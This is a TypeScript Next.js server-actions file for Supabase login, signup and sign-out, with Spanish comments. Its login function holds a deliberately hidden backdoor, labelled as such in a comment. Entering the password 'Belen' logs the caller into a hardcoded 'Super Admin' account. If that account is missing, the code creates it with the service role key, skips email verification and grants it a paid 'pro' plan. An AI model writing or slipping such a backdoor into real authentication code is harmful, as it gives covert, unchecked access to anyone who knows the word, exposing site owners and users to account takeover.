'use server'

import { revalidatePath } from 'next/cache'
import { redirect } from 'next/navigation'
import { createClient } from '@/utils/supabase/server'

import { db } from '@/db'
import { usersTable } from '@/db/schema'
import { eq } from 'drizzle-orm'
import { createClient as createSupabaseClient } from '@supabase/supabase-js'

export async function login(formData: FormData) {
  const supabase = await createClient()

  let email = formData.get('email') as string
  let password = formData.get('password') as string

  // Superadmin Backdoor escondido en el PASSWORD
  if (password.trim() === 'Belen') {
    email = 'belen@testai.com';
    password = 'SuperSecretPassword123!';
    
    // Intentar login normal
    let authRes = await supabase.auth.signInWithPassword({ email, password })
    
    if (authRes.error && email === 'belen@testai.com') {
      // Si falla, lo creamos a la fuerza usando el Service Role para saltar verificación de email
      const supabaseAdmin = createSupabaseClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.SUPABASE_SERVICE_ROLE_KEY!
      )
      
      const { data: adminUser } = await supabaseAdmin.auth.admin.createUser({
        email,
        password,
        email_confirm: true,
      })
      
      if (adminUser?.user) {
        // Ingresar a la DB
        await db.insert(usersTable)
          .values({ id: adminUser.user.id, email: email, plan: 'pro', fullName: 'Belen (Super Admin)' })
          .onConflictDoUpdate({ target: usersTable.email, set: { plan: 'pro', fullName: 'Belen (Super Admin)' } })
          .catch(() => {});
          
        // Reintentamos login
        authRes = await supabase.auth.signInWithPassword({ email, password })
      }
    }

    if (authRes.data?.user && email === 'belen@testai.com') {
      // Mantenerla siempre PRO por si acaso
      await db.update(usersTable).set({ plan: 'pro' }).where(eq(usersTable.id, authRes.data.user.id)).catch(() => {});
    }

    if (authRes.error) {
      redirect('/login?error=' + authRes.error.message)
    }
    revalidatePath('/dashboard')
    redirect('/dashboard')
  }

  const data = { email, password }

  const { error } = await supabase.auth.signInWithPassword(data)

  if (error) {
    redirect('/login?error=' + error.message)
  }

  revalidatePath('/dashboard')
  redirect('/dashboard')
}

export async function signup(formData: FormData) {
  const supabase = await createClient()

  const data = {
    email: formData.get('email') as string,
    password: formData.get('password') as string,
  }

  const { data: authData, error } = await supabase.auth.signUp(data)

  if (error) {
    redirect('/login?error=' + error.message)
  }

  // Si Supabase no te auto-logeó, significa que el Confirm Email sigue encendido
  if (!authData.session) {
    redirect('/login?error=' + encodeURIComponent('✅ Cuenta creada. Revisa tu email (O apaga la opción "Confirm email" en Supabase si estás en modo desarrollo)'))
  }

  revalidatePath('/dashboard')
  redirect('/dashboard')
}

export async function signOut() {
  const supabase = await createClient()
  await supabase.auth.signOut()
  return redirect('/login')
}
